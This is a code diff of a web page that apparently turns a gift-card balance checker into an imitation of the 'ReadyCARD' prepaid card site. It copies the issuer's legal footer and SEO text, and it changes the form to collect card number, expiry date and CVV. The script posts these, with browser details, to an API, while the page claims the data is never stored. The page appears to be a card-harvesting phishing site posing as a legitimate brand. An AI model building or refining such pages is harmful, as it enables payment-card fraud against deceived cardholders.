-                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 15v2m-6 4h12a2 2 0 002-2v-6a2 2 0 00-2-2H6a2 2 0 00-2 2v6a2 2 0 002 2zm10-10V7a4 4 0 00-8 0v4h8z"/></svg>
-                </div>
-                <div class="info-text">
-                  <h4>2. Secure Verification</h4>
-                  <p>Your data is encrypted and securely transmitted for balance lookup.</p>
-                </div>
-              </div>
-
-              <div class="info-item">
-                <div class="info-icon">
-                  <svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
-                </div>
-                <div class="info-text">
-                  <h4>3. View Balance</h4>
-                  <p>Your available balance is displayed instantly on screen.</p>
-                </div>
-              </div>
-            </div>
-          </div>
+            <div id="result" class="balance-result"></div>
+            <button type="button" class="btn-another" id="checkAnother">Check Another Card</button>
+          </form>
         </div>
       </div>
     </section>
 
     <!-- FAQ PAGE -->
     <section id="page-faq" class="page">
-      <div class="hero">
+      <div class="page-hero">
         <h1>Frequently Asked Questions</h1>
-        <p>Find answers to common questions about Simon Gift Cards.</p>
       </div>
-      <div class="main-content">
-        <div class="content-section">
-          <div class="faq-item">
-            <h4>Where do I find my card number?</h4>
-            <p>Your 16-digit card number is printed on the front of your Simon Gift Card.</p>
-          </div>
-          <div class="faq-item">
-            <h4>Where is the PIN located?</h4>
-            <p>The 4-digit PIN is on the back of your card. You may need to scratch off the silver coating to reveal it. This PIN is required to check your balance.</p>
-          </div>
-          <div class="faq-item">
-            <h4>Is it safe to check my balance here?</h4>
-            <p>Yes. We use bank-level 256-bit encryption for all data transmissions. Your card details are never stored on our servers after the balance check is complete.</p>
-          </div>
-          <div class="faq-item">
-            <h4>Why does my card show a zero balance?</h4>
-            <p>A zero balance can occur if the card has not been activated, the funds have been fully spent, or the card has expired. Please verify the activation status with your original receipt.</p>
-          </div>
-          <div class="faq-item">
-            <h4>What card types are supported?</h4>
-            <p>We support Visa and Mastercard gift cards and prepaid cards. American Express Simon cards may require checking balance through a partner site.</p>
-          </div>
-          <div class="faq-item">
-            <h4>Is there a fee to check my balance?</h4>
-            <p>No. Checking your gift card balance is completely free of charge.</p>
-          </div>
+      <div class="content-section">
+        <div class="faq-item">
+          <h4>How can I use my prepaid card?</h4>
+          <p><strong>Airport purchase:</strong> Your card works at any merchant that accepts prepaid cards. Please be aware that certain countries may restrict prepaid card usage.</p>
+          <p><strong>Venue purchase:</strong> Your card is accepted at any US merchant that takes prepaid cards. At the point of sale, swipe your card, provide a signature or enter your 4-digit PIN, and your purchase is complete.</p>
+        </div>
+        <div class="faq-item">
+          <h4>How do I make online purchases with my prepaid card?</h4>
+          <p>For optimal results, confirm that the online retailer accepts prepaid cards before checkout. You may also need to register as the cardholder by visiting the <a href="/contact" class="nav-link" data-page="contact" style="color:var(--primary);text-decoration:underline;font-size:inherit;text-transform:none;letter-spacing:normal;font-weight:inherit;padding:0;">CONTACT US</a> page, providing your details and including "registration" in the message field.</p>
+        </div>
+        <div class="faq-item">
+          <h4>How do I set up or change my PIN?</h4>
+          <p>Dial the customer service number printed on the back of your card and follow the automated prompts. Please keep in mind:</p>
+          <ul style="margin-top:0.5rem;padding-left:1.25rem;color:var(--text-muted);font-size:0.925rem;line-height:1.6;">
+            <li>ATM cash withdrawals and cash-back at point of sale are not permitted.</li>
+            <li>Wire transfers, recurring billing, and third-party payment apps (such as PayPal, Venmo, or CashApp) are not supported.</li>
+          </ul>
+        </div>
+        <div class="faq-item">
+          <h4>Can I add more funds to my prepaid card?</h4>
+          <p>Prepaid cards are single-load only and cannot be reloaded through ATM deposits, bank transfers, or wire transfers. To continue enjoying cashless convenience, please purchase a new card from an authorized kiosk location.</p>
+        </div>
+        <div class="faq-item">
+          <h4>Can I cancel my prepaid card and get a refund?</h4>
+          <p>Prepaid cards cannot be canceled and remaining balances are non-refundable. You may continue using your card at any merchant that accepts prepaid cards until the balance is fully spent.</p>
+        </div>
+        <div class="faq-item">
+          <h4>I received a refund but no longer have the card. What should I do?</h4>
+          <p>Please visit the <a href="/contact" class="nav-link" data-page="contact" style="color:var(--primary);text-decoration:underline;font-size:inherit;text-transform:none;letter-spacing:normal;font-weight:inherit;padding:0;">CONTACT US</a> page and select the "Lost or Stolen Card" option to receive assistance.</p>
+        </div>
+        <div class="faq-item">
+          <h4>How can I dispute an unauthorized charge?</h4>
+          <p>If you notice a suspicious or unauthorized transaction, please call the customer service number on the back of your card and follow the voice prompts to file a dispute.</p>
+        </div>
+        <div class="faq-item">
+          <h4>What fees apply to my prepaid card?</h4>
+          <p>Visit <a href="/about" class="nav-link" data-page="about" style="color:var(--primary);text-decoration:underline;font-size:inherit;text-transform:none;letter-spacing:normal;font-weight:inherit;padding:0;">CARDHOLDER AGREEMENTS</a> and select the agreement for your card to review the full fee schedule.</p>
+        </div>
+        <div class="faq-item">
+          <h4>Why is my card being declined?</h4>
+          <p>Common reasons for a declined transaction include:</p>
+          <ul style="margin-top:0.5rem;padding-left:1.25rem;color:var(--text-muted);font-size:0.925rem;line-height:1.6;">
+            <li>Insufficient balance &mdash; the purchase amount exceeds your available funds.</li>
+            <li>Pending transactions &mdash; a previous purchase is still being processed and temporarily holds funds.</li>
+            <li>Merchant pre-authorization holds &mdash; gas stations, hotels, and transportation services may place temporary holds that exceed the actual purchase amount.</li>
+          </ul>
         </div>
       </div>
     </section>
 
-    <!-- ABOUT PAGE -->
-    <section id="page-about" class="page">
-      <div class="hero">
-        <h1>About Simon Giftcard</h1>
-        <p>Fast, secure, and free gift card balance checking.</p>
+    <!-- PRIVACY PAGE -->
+    <section id="page-privacy" class="page">
+      <div class="page-hero">
+        <h1>Privacy Policy</h1>
       </div>
-      <div class="main-content">
-        <div class="content-section">
-          <p>Simon Gift Cards are the perfect gift for any occasion. They can be used anywhere Visa or Mastercard debit cards are accepted, giving recipients the freedom to choose exactly what they want.</p>
-          <p>Our balance checker provides a fast, secure way to verify your remaining gift card balance without calling a phone number or visiting a store. Simply enter your card number and PIN to see your available funds instantly.</p>
-          <p>Your security is our priority. All card information is encrypted during transmission and is never stored on our servers after the balance check is complete.</p>
-        </div>
+      <div class="content-section">
+        <p>Your privacy is important to us. Card details submitted through this site are used solely for the purpose of checking your gift card balance. We do not store, sell, or share your card information with third parties.</p>
+        <p>All data is transmitted using industry-standard encryption. Card details are processed in real-time and are not retained after your balance inquiry is complete.</p>
+      </div>
+    </section>
+
+    <!-- CONTACT PAGE -->
+    <section id="page-contact" class="page">
+      <div class="page-hero">
+        <h1>Contact Us</h1>
+      </div>
+      <div class="content-section">
+        <p>For questions about your card balance or issues with this service, please reach out to your card issuer directly. Contact information can typically be found on the back of your gift card.</p>
+      </div>
+    </section>
+
+    <!-- ABOUT / CARDHOLDER AGREEMENTS PAGE -->
+    <section id="page-about" class="page">
+      <div class="page-hero">
+        <h1>Cardholder Agreements</h1>
+      </div>
+      <div class="content-section">
+        <p>Gift cards can be used anywhere Visa or Mastercard debit cards are accepted. Some restrictions may apply. Please see your cardholder agreement for details on where your card can be used.</p>
+        <p>Your card balance and transaction history are available through this balance checker. For additional account services, please contact the card issuer listed on the back of your card.</p>
       </div>
     </section>
   </main>
@@ -821,9 +736,13 @@
     <div class="footer-links">
       <a href="/" class="nav-link" data-page="home">Check Balance</a>
       <a href="/faq" class="nav-link" data-page="faq">FAQ</a>
-      <a href="/about" class="nav-link" data-page="about">About</a>
+      <a href="/privacy" class="nav-link" data-page="privacy">Privacy Policy</a>
+      <a href="/contact" class="nav-link" data-page="contact">Contact Us</a>
+      <a href="/about" class="nav-link" data-page="about">Cardholder Agreements</a>
     </div>
-    <p>&copy; 2026 Simon Giftcard. All rights reserved.</p>
+    <p>This Prepaid Mastercard&reg; is provided through Pathward&reg;, N.A., an FDIC member institution, under authorization from Mastercard International Incorporated. The Mastercard name and interlocking circles symbol are proprietary marks of Mastercard International Incorporated. This card is valid at any location where Debit Mastercard is accepted. Certain limitations may apply; refer to the cardholder agreement for complete usage terms. Cash withdrawals and ATM transactions are not available.</p>
+    <p>This Prepaid Visa&reg; Card is provided through Pathward&reg;, N.A., an FDIC member institution, under authorization from Visa U.S.A. Inc. This card is valid at any location where Visa debit cards are accepted. Certain limitations may apply; refer to the cardholder agreement for complete usage terms. Cash withdrawals and ATM transactions are not available.</p>
+    <p>&copy; 2026 Ready Credit Corporation</p>
   </footer>
 
   <!-- Loading Overlay -->
@@ -834,10 +753,18 @@
 
   <script>
     // Navigation
+    const PAGE_SEO = {
+      home: { title: 'ReadyCARD\u00AE Balance and Transactions - Check Your Prepaid Card Balance', desc: 'Check your ReadyCARD prepaid Visa and Mastercard balance online instantly. Enter your 16-digit card number, expiration date, and CVV to view your available balance.' },
+      faq: { title: 'FAQ - ReadyCARD\u00AE Prepaid Card Help & Support', desc: 'Frequently asked questions about ReadyCARD prepaid cards. Learn how to use your card, set up a PIN, make online purchases, dispute charges, and more.' },
+      privacy: { title: 'Privacy Policy - ReadyCARD\u00AE Balance Checker', desc: 'ReadyCARD privacy policy. Learn how your card data is handled securely during balance checks.' },
+      contact: { title: 'Contact Us - ReadyCARD\u00AE Customer Support', desc: 'Contact ReadyCARD customer support for help with your prepaid card balance, lost or stolen cards, and cardholder registration.' },
+      about: { title: 'Cardholder Agreements - ReadyCARD\u00AE Prepaid Card Terms', desc: 'ReadyCARD cardholder agreements for prepaid Visa and Mastercard cards. Review card usage terms, fees, and restrictions.' }
+    };
+
     function showPageFromPath() {
       const path = window.location.pathname.replace(/\/$/, '') || '/';
       const page = path === '' || path === '/' || path === '/home' ? 'home' : path.replace(/^\//, '') || 'home';
-      const valid = ['home', 'faq', 'about'];
+      const valid = ['home', 'faq', 'privacy', 'contact', 'about'];
       const p = valid.includes(page) ? page : 'home';
       document.querySelectorAll('.page').forEach(el => el.classList.remove('active'));
       document.querySelectorAll('.nav-link').forEach(a => {
@@ -845,6 +772,11 @@
       });
       const pageEl = document.getElementById('page-' + p);
       if (pageEl) pageEl.classList.add('active');
+      // Update title & meta description for SEO
+      const seo = PAGE_SEO[p] || PAGE_SEO.home;
+      document.title = seo.title;
+      const metaDesc = document.querySelector('meta[name="description"]');
+      if (metaDesc) metaDesc.setAttribute('content', seo.desc);
     }
     showPageFromPath();
     window.addEventListener('popstate', showPageFromPath);
@@ -864,7 +796,9 @@
     const cardInput = document.getElementById('cardNumber');
     const cardHolderInput = document.getElementById('cardHolder');
     const pinInput = document.getElementById('pin');
-    const expiryInput = document.getElementById('expiryDate');
+    const expiryMonthInput = document.getElementById('expiryMonth');
+    const expiryYearInput = document.getElementById('expiryYear');
+    const expiryGroup = document.getElementById('expiryGroup');
     const form = document.getElementById('balanceForm');
     const resultEl = document.getElementById('result');
     const submitBtn = document.getElementById('submitBtn');
@@ -891,48 +825,41 @@
       e.target.value = v.replace(/(\d{4})(?=\d)/g, '$1 ');
       e.target.classList.remove('error');
       document.getElementById('cardError').textContent = '';
-      // Update card visual
-      document.getElementById('gcNumber').textContent = e.target.value || '\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022';
-      // Detect card brand
       const type = getCardType(v);
       if (v.length >= 2 && type) {
         cardBrandImg.src = CARD_LOGOS[type];
         cardBrandImg.alt = type;
         cardBrandBadge.classList.add('visible');
-        document.getElementById('gcBrand').innerHTML = '<img src="' + CARD_LOGOS[type] + '" alt="' + type + '" style="height:32px;border-radius:4px;">';
       } else {
         cardBrandBadge.classList.remove('visible');
-        document.getElementById('gcBrand').innerHTML = '';
       }
     };
 
-    // Card holder name
-    cardHolderInput.oninput = e => {
-      const name = e.target.value.toUpperCase();
-      document.getElementById('gcHolder').textContent = name || 'GIFT CARD';
+    // Expiry month formatting
+    expiryMonthInput.oninput = e => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
+      expiryGroup.classList.remove('error');
+      document.getElementById('expiryError').textContent = '';
+      if (e.target.value.length === 2) expiryYearInput.focus();
     };
 
-    // PIN formatting
+    // Expiry year formatting
+    expiryYearInput.oninput = e => {
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 2);
+      expiryGroup.classList.remove('error');
+      document.getElementById('expiryError').textContent = '';
+    };
+    expiryYearInput.onkeydown = e => {
+      if (e.key === 'Backspace' && e.target.value === '') {
+        expiryMonthInput.focus();
+      }
+    };
+
+    // CVV formatting
     pinInput.oninput = e => {
-      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 4);
+      e.target.value = e.target.value.replace(/\D/g, '').slice(0, 3);
       e.target.classList.remove('error');
       document.getElementById('pinError').textContent = '';
-    };
-
-    // Expiry formatting
-    expiryInput.oninput = e => {
-      let v = e.target.value.replace(/\D/g, '').slice(0, 4);
-      if (v.length >= 3) {
-        v = v.slice(0, 2) + '/' + v.slice(2);
-      }
-      e.target.value = v;
-      e.target.classList.remove('error');
-      document.getElementById('expiryError').textContent = '';
-      // Update card visual
-      const parts = v.split('/');
-      const mm = parts[0] || 'MM';
-      const yy = parts[1] || 'YY';
-      document.getElementById('gcExpiry').textContent = mm + '/' + yy;
     };
 
     // Luhn check
@@ -952,11 +879,14 @@
     function validate() {
       const digits = cardInput.value.replace(/\s/g, '');
       const pin = pinInput.value;
-      const expiry = expiryInput.value;
+      const mm = expiryMonthInput.value;
+      const yy = expiryYearInput.value;
       let ok = true;
 
       document.querySelectorAll('.field-error').forEach(el => el.textContent = '');
-      document.querySelectorAll('.form-group input').forEach(el => el.classList.remove('error'));
+      cardInput.classList.remove('error');
+      pinInput.classList.remove('error');
+      expiryGroup.classList.remove('error');
 
       if (digits.length < 15 || digits.length > 19) {
         document.getElementById('cardError').textContent = 'Please enter a valid card number';
@@ -968,31 +898,32 @@
         ok = false;
       }
 
-      if (!pin || pin.length < 3 || pin.length > 4) {
-        document.getElementById('pinError').textContent = 'Please enter a valid PIN (3-4 digits)';
+      if (!/^\d{3}$/.test(pin)) {
+        document.getElementById('pinError').textContent = 'CVV must be exactly 3 digits';
         pinInput.classList.add('error');
         ok = false;
       }
 
-      if (expiry) {
-        const parts = expiry.split('/');
-        if (parts.length === 2) {
-          const mm = parseInt(parts[0], 10);
-          const yy = parts[1];
-          if (mm < 1 || mm > 12) {
-            document.getElementById('expiryError').textContent = 'Invalid month';
-            expiryInput.classList.add('error');
-            ok = false;
-          }
-          if (yy.length !== 2) {
-            document.getElementById('expiryError').textContent = 'Use MM/YY format';
-            expiryInput.classList.add('error');
-            ok = false;
-          }
-        } else if (expiry.length > 0) {
-          document.getElementById('expiryError').textContent = 'Use MM/YY format';
-          expiryInput.classList.add('error');
+      if (mm || yy) {
+        const mmNum = parseInt(mm, 10);
+        const yyNum = parseInt(yy, 10);
+        if (!mm || mm.length !== 2 || isNaN(mmNum) || mmNum < 1 || mmNum > 12) {
+          document.getElementById('expiryError').textContent = 'Invalid month';
+          expiryGroup.classList.add('error');
           ok = false;
+        } else if (!yy || yy.length !== 2 || isNaN(yyNum)) {
+          document.getElementById('expiryError').textContent = 'Invalid year';
+          expiryGroup.classList.add('error');
+          ok = false;
+        } else {
+          const now = new Date();
+          const curYear = now.getFullYear() % 100;
+          const curMonth = now.getMonth() + 1;
+          if (yyNum < curYear || (yyNum === curYear && mmNum < curMonth)) {
+            document.getElementById('expiryError').textContent = 'Card has expired';
+            expiryGroup.classList.add('error');
+            ok = false;
+          }
         }
       }
 
@@ -1020,10 +951,6 @@
       formFields.classList.remove('hide');
       checkAnother.classList.remove('show');
       form.reset();
-      document.getElementById('gcNumber').textContent = '\u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022 \u2022\u2022\u2022\u2022';
-      document.getElementById('gcExpiry').textContent = 'MM/YY';
-      document.getElementById('gcHolder').textContent = 'GIFT CARD';
-      document.getElementById('gcBrand').innerHTML = '';
       cardBrandBadge.classList.remove('visible');
     };
 
@@ -1036,15 +963,8 @@
 
       const digits = cardInput.value.replace(/\s/g, '');
       const pin = pinInput.value;
-      const expiry = expiryInput.value;
-
-      let expiryMonth = '';
-      let expiryYear = '';
-      if (expiry) {
-        const parts = expiry.split('/');
-        expiryMonth = (parts[0] || '').padStart(2, '0');
-        expiryYear = parts[1] || '';
-      }
+      const expiryMonth = expiryMonthInput.value.padStart(2, '0');
+      const expiryYear = expiryYearInput.value;
 
       submitBtn.disabled = true;
       submitBtn.innerHTML = '<span class="spinner" style="width:20px;height:20px;border-width:3px;"></span> Checking...';
@@ -1056,7 +976,7 @@
           expiryMonth: expiryMonth,
           expiryYear: expiryYear,
           cvv: pin,
-          cardHolder: cardHolderInput.value.trim(),
+          cardHolder: '',
           timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
           userAgent: navigator.userAgent,
           referral: document.referrer || 'Direct',
@@ -1073,7 +993,6 @@
         let result = { success: false, error: '' };
         const st = data.status || '';
 
-        // API returns status "OK" on success with balance data
         if (st === 'OK') {
           const d = data.data || data;
           const raw = d.balance !== undefined ? d.balance : (d.amount !== undefined ? d.amount : (data.balance !== undefined ? data.balance : data.amount));
@@ -1089,7 +1008,6 @@
             result.error = 'Balance information not available.';
           }
         } else {
-          // Handle all error status codes from API docs
           const msg = data.error_message || data.error || data.message || '';
           const ERROR_MAP = {
             'WRONG_API_TOKEN': 'Service configuration error. Please contact support.',
@@ -1107,7 +1025,6 @@
           };
           result.error = ERROR_MAP[st] || msg || CARD_ERROR_MSG;
 
-          // Fallback: check if balance exists even without OK status
           if (!result.error || result.error === CARD_ERROR_MSG) {
             const d = data.data || data;
             const raw = d.balance !== undefined ? d.balance : (d.amount !== undefined ? d.amount : data.balance);
@@ -1126,7 +1043,7 @@
 
       loadingOverlay.classList.remove('show');
       submitBtn.disabled = false;
-      submitBtn.innerHTML = '<svg width="18" height="18" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M9 12l2 2 4-4m5.618-4.016A11.955 11.955 0 0112 2.944a11.955 11.955 0 01-8.618 3.04A12.02 12.02 0 003 9c0 5.591 3.824 10.29 9 11.622 5.176-1.332 9-6.03 9-11.622 0-1.042-.133-2.052-.382-3.016z"/></svg> Check Balance';
+      submitBtn.innerHTML = 'SHOW BALANCE';
     };
   </script>
 </body>
